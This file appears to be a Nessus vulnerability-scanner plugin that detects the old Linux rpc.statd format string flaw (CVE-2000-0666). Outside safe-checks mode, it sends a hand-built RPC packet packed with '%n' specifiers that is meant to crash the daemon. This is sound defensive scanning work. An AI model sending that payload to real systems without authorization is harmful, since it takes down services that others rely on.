#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(10544);
  script_version("$Revision: 1.45 $");
  script_cvs_date("$Date: 2016/11/03 20:40:06 $");

  script_cve_id("CVE-2000-0666", "CVE-2000-0800");
  script_bugtraq_id(1480);
  script_osvdb_id(443, 57715);

  script_name(english:"Linux Multiple statd Packages Remote Format String");
  script_summary(english:"Checks the presence of a RPC service");

  script_set_attribute(attribute:'synopsis', value:"The remote service is vulnerable to a buffer overflow.");
  script_set_attribute(attribute:'description', value:
"The remote statd service could be brought down with a format string
attack - it now needs to be restarted manually.

This means that an attacker may execute arbitrary code thanks to a bug
in this daemon.");
  script_set_attribute(attribute:'see_also', value:"http://seclists.org/bugtraq/2000/Jul/206");
  script_set_attribute(attribute:'solution', value:"Upgrade to the latest version of rpc.statd.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2000/07/16");
  script_set_attribute(attribute:"plugin_publication_date", value:"2000/11/10");

  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_MIXED_ATTACK); # mixed
  script_copyright(english:"This script is Copyright (C) 2000-2016 Tenable Network Security, Inc.");
  script_family(english:"RPC");

  script_dependencie("os_fingerprint.nasl", "rpc_portmap.nasl", "redhat_fixes.nasl");
  script_require_keys("rpc/portmap", "Settings/ParanoidReport");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("sunrpc_func.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

if ( get_kb_item("Host/Solaris/Version") )  exit(0);

if ( get_kb_item("CVE-2000-0666") ) exit(0);

port = get_rpc_port2(program:100024,
		protocol:IPPROTO_UDP);

if ( ! port && safe_checks() )
	port = get_rpc_port2(program:100024,
		protocol:IPPROTO_TCP);

if(port)
{
 if(safe_checks())
 {
  if ( !get_kb_item("Settings/PCI_DSS") )
  {
  os = get_kb_item("Host/OS");
  if ( os ) {
	if ("Linux" >!< os ) exit(0);
        if ("Linux Kernel 2.4" >< os ||
	    "Linux Kernel 2.6" >< os ) exit(0);
	}
  else if ( report_paranoia < 2 ) exit(0);
  }


  report = "
The remote statd service may be vulnerable to a format string attack.

This means that an attacker may execute arbitrary code thanks to a bug in
this daemon.

Only older versions of statd under Linux are affected by this problem.

*** Nessus reports this vulnerability using only information that was gathered.
*** Use caution when testing without safe checks enabled.";


  security_hole(port:port, extra:report, protocol:"udp");
  exit(0);
 }

if (! get_udp_port_state(port)) exit(0, "UDP port "+port+" is not open.");
#
# Begin request
#
beg = raw_string(0x78, 0xE0, 0x80, 0x4D, 0x00, 0x00,
		 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x01,
		 0x86, 0xB8, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
		 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
		 0x00, 0x20, 0x3A, 0x0B, 0xB6, 0xB8, 0x00, 0x00,
		 0x00, 0x09, 0x6C, 0x6F, 0x63, 0x61, 0x6C, 0x68,
		 0x6F, 0x73, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00,
		 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x4E, 0x00,
		 0x00, 0x00);

soc = open_sock_udp(port);
send(socket:soc, data:beg);
r = recv(socket:soc, length:4096);
if(r)
{
#
# Ok - rpc.statd is alive. Let's now send it a couple of %n's
#
req = raw_string(0x42, 0x99, 0x30, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x01,
		0x86, 0xB8, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
		0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
		0x00, 0x20, 0x3A, 0x0B, 0xB4, 0xB3, 0x00, 0x00,
		0x00, 0x09, 0x6C, 0x6F, 0x63, 0x61, 0x6C, 0x68,
		0x6F, 0x73, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x28, 0x6E, 0x25,
		0x6E, 0x25, 0x6E, 0x25, 0x6E, 0x25, 0x6E, 0x25,
		0x6E, 0x25, 0x6E, 0x25, 0x6E, 0x25, 0x6E, 0x25,
		0x6E, 0x25, 0x6E, 0x25, 0x6E, 0x25, 0x6E, 0x25,
		0x6E, 0x25, 0x6E, 0x25, 0x6E, 0x25, 0x6E, 0x25,
		0x6E, 0x25, 0x6E, 0x25, 0x6E, 0x25);


send(socket:soc, data:req);
r = recv(socket:soc, length:1024);

if(!r){
	security_hole(port:port, protocol:"udp");
	}
}

close(soc);
}
